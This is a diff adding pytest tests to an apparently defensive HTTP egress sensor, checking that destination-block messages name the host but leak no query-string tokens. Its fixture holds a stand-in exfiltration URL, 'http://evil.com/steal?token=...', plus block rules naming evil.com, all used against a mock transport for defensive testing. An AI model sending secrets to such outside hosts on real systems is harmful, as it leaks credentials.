@@ -168,3 +168,112 @@ def test_explicit_destination_block_enforced_in_monitor_mode():
     s.block_urls(["evil.com"])
     assert _blocked(lambda: c.get("http://evil.com/x"))
     assert sent == []
+
+
+# ── the destination-block message must not carry the request URL ────────────
+# The audit record on this path has always been host-only, and says so: a query
+# string routinely carries a token or an API key. The console line beside it was
+# broader than the record, printing the full URL. Same class as the fail-open
+# log leak fixed on the scan path, in a surface that fix did not touch.
+
+_URL_SECRET = "SECRET123"
+_SECRET_URL = f"http://evil.com/steal?token={_URL_SECRET}&user=alice"
+
+
+def _capture_block(sensor_kwargs=None, policy=None, url=_SECRET_URL):
+    """Trigger a destination block and capture stdout, logs and telemetry."""
+    import contextlib as _contextlib
+    import io as _io
+    import json as _json
+    import logging as _logging
+
+    events = []
+
+    class _Cap:
+        def report(self, batch):
+            events.extend(batch)
+
+        def close(self):
+            pass
+
+    def handler(request):
+        return httpx.Response(200, json={"result": "ok"})
+
+    s = DelphiSensor(agent_id="urltest", enforcement_mode="block",
+                     reporter=_Cap(), **(sensor_kwargs or {}))
+    if policy is not None:
+        assert s.set_policy(policy) is True
+    else:
+        s.block_urls(["evil.com"])
+    c = s.protect_http(httpx.Client(transport=httpx.MockTransport(handler)))
+
+    logbuf = _io.StringIO()
+    handler_l = _logging.StreamHandler(logbuf)
+    lg = _logging.getLogger("xaidr.sensor")
+    lg.addHandler(handler_l)
+    lg.setLevel(_logging.WARNING)
+    out = _io.StringIO()
+    try:
+        with _contextlib.redirect_stdout(out):
+            try:
+                c.get(url)
+            except DelphiBlockedError:
+                pass
+        s.flush()
+    finally:
+        lg.removeHandler(handler_l)
+    return out.getvalue(), logbuf.getvalue(), _json.dumps(events)
+
+
+def test_blocked_url_message_carries_no_query_string_or_secret():
+    stdout, logtext, telemetry = _capture_block()
+    for surface, text in (("stdout", stdout), ("log", logtext), ("telemetry", telemetry)):
+        assert _URL_SECRET not in text, f"secret leaked into {surface}: {text!r}"
+        assert "token=" not in text, f"query string leaked into {surface}: {text!r}"
+        assert "?" not in text, f"query separator leaked into {surface}: {text!r}"
+
+
+def test_blocked_url_message_still_names_the_host():
+    """Sanitising must not make the message useless."""
+    stdout, _log, telemetry = _capture_block()
+    assert "evil.com" in stdout, stdout
+    assert "URL BLOCKED" in stdout, stdout
+    assert "evil.com" in telemetry, telemetry
+
+
+def test_blocked_url_message_still_names_the_operators_own_pattern():
+    """The echoed pattern is the operator's own block_urls() substring, which is
+    configuration feedback (which of your rules fired), not request-derived."""
+    stdout, _log, _tele = _capture_block()
+    assert "matches pattern 'evil.com'" in stdout, stdout
+
+
+def test_policy_destination_block_also_carries_no_url():
+    """The deny-destination POLICY branch had the identical shape."""
+    policy = {
+        "version": "1",
+        "defaults": {"effect": "allow", "unclassified": "allow"},
+        "rules": [{"id": "deny-evil", "effect": "block",
+                   "match": {"destination_identifier": ["evil.com"]}}],
+    }
+    stdout, logtext, telemetry = _capture_block(policy=policy)
+    for surface, text in (("stdout", stdout), ("log", logtext), ("telemetry", telemetry)):
+        assert _URL_SECRET not in text, f"secret leaked into {surface}: {text!r}"
+        assert "token=" not in text, f"query string leaked into {surface}: {text!r}"
+    assert "evil.com" in stdout, stdout
+    assert "DESTINATION BLOCKED" in stdout, stdout
+
+
+def test_the_audit_record_and_the_console_line_agree_on_the_identifier():
+    """They are computed once and shared, so they cannot drift into disclosing
+    different amounts."""
+    import json as _json
+
+    stdout, _log, telemetry = _capture_block()
+    events = _json.loads(telemetry)
+    dests = [e["data"].get("destinationIdentifier") for e in events
+             if isinstance(e.get("data"), dict)]
+    dests = [d for d in dests if d]
+    assert dests, f"no destination in telemetry: {telemetry}"
+    for d in dests:
+        assert d in stdout, f"audit says {d!r} but the console line does not contain it"
